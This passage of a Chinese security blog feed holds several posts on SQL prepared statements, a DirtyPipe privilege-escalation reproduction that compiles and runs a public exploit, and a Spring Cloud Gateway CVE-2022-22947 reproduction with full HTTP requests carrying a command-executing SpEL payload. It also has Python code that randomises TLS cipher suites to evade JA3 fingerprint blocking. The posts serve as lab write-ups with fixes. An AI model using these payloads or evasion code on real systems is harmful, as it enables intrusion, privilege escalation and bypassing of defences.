id="0x02-之前有听人说order-by后面的语句是不会参与预编译？"><a href="#0x02-之前有听人说order-by后面的语句是不会参与预编译？" class="headerlink" title="0x02 之前有听人说order by后面的语句是不会参与预编译？"></a>0x02 之前有听人说order by后面的语句是不会参与预编译？</h2><blockquote><p>这句话是错误的。Order<br>by也是会参与预编译的。从我们上面的jdbc的setString算法可以看到，是因为setString会在参数的前后加上’’，变成字符串。导致order<br>by失去了原本的意义。只能说是预编译方式的order by不适用而已。所以对于这种order<br>by的防御的话建议是直接写死在代码里面。对于order by方式的注入我们可以通过返回数据的顺序的不同来获取数据。</p></blockquote><h2 id="0x03-为什么预编译能让传入的数据只能是数据，它的底层原理是怎样的？"><a href="#0x03-为什么预编译能让传入的数据只能是数据，它的底层原理是怎样的？" class="headerlink" title="0x03 为什么预编译能让传入的数据只能是数据，它的底层原理是怎样的？"></a>0x03 为什么预编译能让传入的数据只能是数据，它的底层原理是怎样的？</h2><blockquote><p>通常来说，一条SQL语句从传入到运行经历了生成语法树、执行计划优化、执行这几个阶段。在预编译过程中，数据库首先接收到带有预编译占位符?的SQL语句，解析生成语法树(Lex)，并缓存在cache中，然后接收对应的参数信息，从cache中取出语法树设置参数，然后再进行优化和执行。由于参数信息传入前语法树就已生成，执行的语法结构也就无法因参数而改变，自然也就杜绝了SQL注入的出现。这样一个深刻而简单的原因，相信已经解答了我们最开始的疑问。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-0847 DirtyPipe 提权漏洞 复现</title>
      <link href="/2022/03/08/CVE-2022-0847%20DirtyPipe%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/08/CVE-2022-0847%20DirtyPipe%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>DirtyPipe (CVE-2022-0847) 是自 5.8 以来 Linux 内核中的一个漏洞，它允许覆盖任意只读文件中的数据。</p><p>其要求内核是5.8以上的才能利用</p><h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><p>原文地址：<code>https://dirtypipe.cm4all.com/</code></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/41afe09d1811a85fd95f6d038a07b2ab.png" alt="image-20220308094009805"></p><p>创建一个低权限用户</p><p>我的环境是docker里面</p><p>uname -a</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux ae801d08733b 5.10.76-linuxkit #1 SMP Mon Nov 8 10:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>cat /etc/redhat-release</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure><h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit.git</span><br><span class="line">gcc exploit.c -o exp -std&#x3D;c99</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/316646959f87f0595b4e0e742cb0e583.png" alt="image-20220308101029749"></p><p>编译报错如下图，要加上上 std=c99</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exp -std&#x3D;c99</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/bec0cb5b82f337879c8889cfb510877b.png" alt="image-20220308101338118"></p><h2 id="备份密码文件"><a href="#备份密码文件" class="headerlink" title="备份密码文件"></a>备份密码文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;etc&#x2F;passwd &#x2F;tmp&#x2F;passwd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 安全 漏洞 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</title>
      <link href="/2022/03/06/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22947%EF%BC%89/"/>
      <url>/2022/03/06/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-22947%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><ul><li><p>Spring Cloud Gateway是基于Spring Framework 和 Spring Boot构建的API网关，它旨在为微服务架构提供一种简单、有效、统一的API路由管理方式。华为云提醒使用Spring Cloud Gateway的用户及时安排自检并做好安全加固。</p><p>参考链接：</p><p><a href="https://tanzu.vmware.com/security/cve-2022-22947" target="_blank" rel="noopener">CVE-2022-22947: Spring Cloud Gateway Code Injection Vulnerability</a></p><p><a href="https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/" target="_blank" rel="noopener">CVE-2022-22947: SPEL CASTING AND EVIL BEANS</a></p></li></ul><h1 id="0x02-漏洞环境"><a href="#0x02-漏洞环境" class="headerlink" title="0x02 漏洞环境"></a>0x02 漏洞环境</h1><p>推荐直接vulhub，干净卫生，兄弟们</p><p><a href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947" target="_blank" rel="noopener">vulhub/spring/CVE-2022-22947 at master · vulhub/vulhub (github.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8080</code>即可看到演示页面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/beda7bbbc18f48070480b2837ca11658.png" alt="image-20220306171449209"></p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>利用这个漏洞需要分多步。</p><p>首先，发送如下数据包即可添加一个包含恶意SpEL表达式的路由：</p><p>（此处的payload是升级之后的 ，利用AddResponseHeader去达到回显）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http:&#x2F;&#x2F;example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/17a2d313df10dc4bae3f48dfcf5a7c0a.png" alt="image-20220306171657617"></p><p>然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;gateway&#x2F;refresh HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6980df5629aba66d845b0a5b2f7537a7.png" alt="image-20220306171745622"></p><p>发送如下数据包即可查看执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/56cfac29d60b854ff3d6001335dab467.png" alt="image-20220306171815840"></p><h1 id="0x04-痕迹处理"><a href="#0x04-痕迹处理" class="headerlink" title="0x04 痕迹处理"></a>0x04 痕迹处理</h1><p>引用 panda</p><blockquote><p>在这里提醒一下，在实际环境中，如果由于某种原因删除不起作用，有可能会导致刷新请求失败，那么就会有可能会导致站点出现问题，所以在实际测试的过程中，建议别乱搞，不然就要重启站点了。</p></blockquote><p>最后，发送如下数据包清理现场，删除所添加的路由：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DELETE &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/3658e94d13ce48594e8ce6c2f85aaaf3.png" alt="image-20220306172343041"></p><p>再刷新下路由：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;gateway&#x2F;refresh HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>再触发，路由已经没有了<img src="https://img-blog.csdnimg.cn/img_convert/6c0bfcecbebd1093ce9a3df2508f1d7d.png" alt="image-20220306172420483"></p><h1 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h1><p>升级最新版</p><p>目前官方已发布修复版本修复了该漏洞</p><p><a href="https://github.com/spring-cloud/spring-cloud-gateway/tags" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-gateway/tags</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux 安全 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反爬虫SSL TLS指纹识别和绕过JA3算法.md</title>
      <link href="/2022/02/18/%E5%8F%8D%E7%88%AC%E8%99%ABSSL%20TLS%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%92%8C%E7%BB%95%E8%BF%87JA3%E7%AE%97%E6%B3%95.md/"/>
      <url>/2022/02/18/%E5%8F%8D%E7%88%AC%E8%99%ABSSL%20TLS%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%92%8C%E7%BB%95%E8%BF%87JA3%E7%AE%97%E6%B3%95.md/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​ 有时候会发现一种情况，用正常浏览器可以访问，但是用脚本或者挂一下代理访问https的网站就直接405禁止访问了。</p><p>​ 这种情况就有可能是 识别了你的TLS指纹，这种情况换随机UA都是没什么用的。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7ab96e9ad791a55c36aa8ee72e22c9d6.png" alt="image-20220208160912763"></p><p>​ 查阅资料之后，发现应该是waf识别你的TLS指纹，标记为恶意直接禁止了，其中识别的算法主要是利用JA3和JA3S实现TLS指纹识别功能，所以学习了一下。</p><h1 id="0x01-实际测试一下"><a href="#0x01-实际测试一下" class="headerlink" title="0x01 实际测试一下"></a>0x01 实际测试一下</h1><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>第一步，我们就看看我们的特征是什么，测试一下到底改hearder方法行不行。代码是测试代码，主要就是重复发包看一下特征。</p><p>主要有三种：修改过tls的，原生的，改header头的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author: Zeo</span></span><br><span class="line"><span class="comment"># python: 3.7 </span></span><br><span class="line"><span class="comment"># software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">文件说明：</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="keyword">import</span> create_urllib3_context</span><br><span class="line"></span><br><span class="line">ORIGIN_CIPHERS = (</span><br><span class="line">    <span class="string">'ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DESAdapter</span><span class="params">(HTTPAdapter)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 在请求中重新启用 3DES 支持的 TransportAdapter</span></span><br><span class="line">        CIPHERS = ORIGIN_CIPHERS.split(<span class="string">":"</span>)</span><br><span class="line">        random.shuffle(CIPHERS)</span><br><span class="line">        <span class="comment"># print("1:", CIPHERS)</span></span><br><span class="line">        CIPHERS = <span class="string">":"</span>.join(CIPHERS)</span><br><span class="line">        <span class="comment"># print("2:", CIPHERS)</span></span><br><span class="line">        self.COPHERS = CIPHERS + <span class="string">":!aNULL:!eNULL:!MD5"</span></span><br><span class="line">        super(DESAdapter, self).__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在一般情况下，当我们实现一个子类的时候，__init__的第一行应该是super().__init__(*args, **kwargs)，</span></span><br><span class="line">    <span class="comment"># 但是由于init_poolmanager和proxy_manager_for是复写了父类的两个方法，</span></span><br><span class="line">    <span class="comment"># 这两个方法是在执行super().__init__(*args, **kwargs)的时候就执行的。</span></span><br><span class="line">    <span class="comment"># 所以，我们随机设置 Cipher Suits 的时候，需要放在super().__init__(*args, **kwargs)的前面。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_poolmanager</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        context = create_urllib3_context(ciphers=self.COPHERS)</span><br><span class="line">        kwargs[<span class="string">"ssl_context"</span>] = context</span><br><span class="line">        <span class="keyword">return</span> super(DESAdapter, self).init_poolmanager(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proxy_manager_for</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        context = create_urllib3_context(ciphers=self.COPHERS)</span><br><span class="line">        kwargs[<span class="string">"ssl_context"</span>] = context</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67'</span>&#125;</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.headers.update(headers)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"修改TSL 加密算发"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="comment"># 其中，s.mount的第一个参数表示这个适配器只在https://ja3er.com开头的网址中生效</span></span><br><span class="line">        s.mount(<span class="string">"https://ja3er.com"</span>, DESAdapter())</span><br><span class="line">        response = s.get(<span class="string">"https://ja3er.com/json"</span>).json()</span><br><span class="line">        print(response)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"原生 requests.get"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        res = requests.get(url=<span class="string">"https://ja3er.com/json"</span>).json()</span><br><span class="line">        print(res)</span><br><span class="line">    print(<span class="string">"修改 hearder requests.get"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        SignHeaders = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'application/json, text/plain, */*'</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">            <span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'https://www.baidu.com/'</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(url=<span class="string">"https://ja3er.com/json"</span>, headers=SignHeaders).json()</span><br><span class="line">        print(res)</span><br></pre></td></tr></table></figure><p>测试结果如下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5370e45bb13ae5a426e41ab9dbd514ba.png" alt="image-20220208110639399"></p><ul><li>也就是说我们修改hearder这个东西里面字段（User-Agent，Referer,各种东西）其实都不会影响这个指纹，因为他是计算 SSL中TLS得出的</li><li>用python的requests库发包，ja3_hash一直都是一个固定值</li><li>8896468359a279a05de2651c5021ac6f</li><li>所以我们可以使用TLS Client Hello数据包中的详细信息对客户端应用程序进行指纹识别。我们按照这个作为规则，就可以直接禁止调python的原生脚本</li></ul><p>百度之后发现这个检测算法，叫做<code>JA3算法</code></p><h1 id="0x02-JA3算法"><a href="#0x02-JA3算法" class="headerlink" title="0x02 JA3算法"></a>0x02 JA3算法</h1><p>JA3就是一种在线识别TLS客户端指纹的方法</p><p>JA3 算法收集了 SSL 请求里面的信息，包括但不限于 SSL/TLS 版本，<code>Cipher Suites</code>数量，浏览器扩展列表，<code>elliptic curves</code>等等。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d7fb6b2bd57918bcd4f9fa42abba7b17.png" alt="image-20220208143328727"></p><p>这些字段的顺序如下所示：</p><p>TLSVersion，Ciphers，Extensions，EllipticCurves，EllipticCurvePointFormats</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">771,4866-4867-4865-49196-49200-49195-49199-52393-52392-159-158-52394-49327-49325-49326-49324-49188-49192-49187-49191-49162-49172-49161-49171-49315-49311-49314-49310-107-103-57-51-157-156-49313-49309-49312-49308-61-60-53-47-255,0-11-10-16-22-23-49-13-43-45-51-21,29-23-1035-25-24,0-1-2</span><br></pre></td></tr></table></figure><p>如果Client Hello数据包中没有TLS扩展（TLS Extensions），则这些字段的值为空。</p><p>然后，会计算这些字符串的MD5哈希值，以生成易于使用和共享的长度为32字符的指纹。它们就是JA3 TLS客户端的指纹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ja3_hash &#x3D; 8896468359a279a05de2651c5021ac6f</span><br></pre></td></tr></table></figure><p>对于每个客户端来说，总是以相同的方式进行相应，所以JA3指纹就是唯一的。</p><h1 id="0x03-wireshark抓包"><a href="#0x03-wireshark抓包" class="headerlink" title="0x03 wireshark抓包"></a>0x03 wireshark抓包</h1><p>正常浏览器可以访问 <a href="https://ja3er.com/json" target="_blank" rel="noopener">https://ja3er.com/json</a> 这个站点，查看自己的ja3hash，可以看到每个浏览器都不一样的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f54117e75375c3803fa9da87aae7f330.png" alt="image-20220208111214685"></p><p>下面是具体的wireshark抓包，查看一下具体的细节</p><h2 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span 